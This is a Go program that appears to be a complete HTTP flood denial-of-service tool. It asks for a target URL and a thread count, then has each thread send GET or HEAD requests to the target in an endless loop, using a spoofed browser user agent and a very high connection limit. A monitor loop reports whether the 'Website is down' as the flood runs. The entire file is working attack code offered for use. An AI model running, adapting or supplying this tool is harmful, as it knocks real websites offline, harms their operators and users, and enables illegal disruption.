package main

import (
	"fmt"
	"sync"
	"bufio"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter HTTP method (HEAD or GET): ")
	methodBytes, _, _ := reader.ReadLine()
	method := strings.ToUpper(strings.TrimSpace(string(methodBytes)))

	fmt.Print("Enter URL: ")
	urlBytes, _, _ := reader.ReadLine()
	url := string(urlBytes)

	fmt.Print("Enter number of threads: ")
	threadBytes, _, _ := reader.ReadLine()
	numThreads, _ := strconv.Atoi(strings.TrimSpace(string(threadBytes)))

	var wg sync.WaitGroup
	wg.Add(numThreads)

	client := &fasthttp.Client{
		MaxIdleConnDuration: 10 * time.Second,
		ReadTimeout:         10 * time.Second,
		WriteTimeout:        10 * time.Second,
		MaxConnsPerHost:     100000,
	}

	for i := 0; i < numThreads; i++ {
		go func() {
			defer wg.Done()
			req := fasthttp.AcquireRequest()
			defer fasthttp.ReleaseRequest(req)

			req.Header.SetMethod(method)
			req.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
			req.SetRequestURI(url)

			for {
				client.Do(req, nil)
			}
		}()
	}

	go func() {
		reqStatus := fasthttp.AcquireRequest()
		respStatus := fasthttp.AcquireResponse()
		defer func() {
			fasthttp.ReleaseRequest(reqStatus)
			fasthttp.ReleaseResponse(respStatus)
		}()

		reqStatus.Header.SetMethod(method)
        reqStatus.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
        reqStatus.SetRequestURI(url)

        for {
            time.Sleep(10 * time.Second)
            start := time.Now()
            err := client.Do(reqStatus, respStatus)
            duration := time.Since(start)
            statusCode := respStatus.StatusCode()
            body := string(respStatus.Body())
            if err != nil || statusCode == 404 || statusCode == 504 || strings.Contains(body, "unavailable") {
                fmt.Println("Website is down")
            } else {
                fmt.Printf("Website is up ( %.2f ms)\n", float64(duration.Milliseconds()))
            }
        }
    }()

	wg.Wait()
}
